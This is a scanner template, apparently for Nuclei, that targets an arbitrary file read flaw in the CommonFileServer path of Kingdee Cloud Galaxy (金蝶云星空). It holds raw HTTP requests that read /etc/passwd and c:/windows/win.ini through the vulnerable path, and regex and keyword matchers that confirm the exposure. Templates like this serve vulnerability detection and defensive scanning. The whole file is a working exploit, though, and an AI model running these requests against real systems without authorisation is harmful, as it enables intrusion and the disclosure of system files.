id: jindieOA-CommonFileserver-read-file
info:
  name: 金蝶云星空 CommonFileserver 任意文件读取漏洞
  author: cnaq
  severity: medium
  description: 金蝶云星空 CommonFileserver 任意文件读取漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA%20CommonFileserver%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: jindieOA,server_file,Apusic,dir
requests:
  - raw:
      - | #linux
        GET /CommonFileServer/etc/passwd HTTP/1.1
        Host: {{Hostname}}

      - | #windows
        GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "bit app support"
          - "fonts"
          - "extensions"
        condition: and

      - type: regex
        regex:
          - "root:.*:0:0:"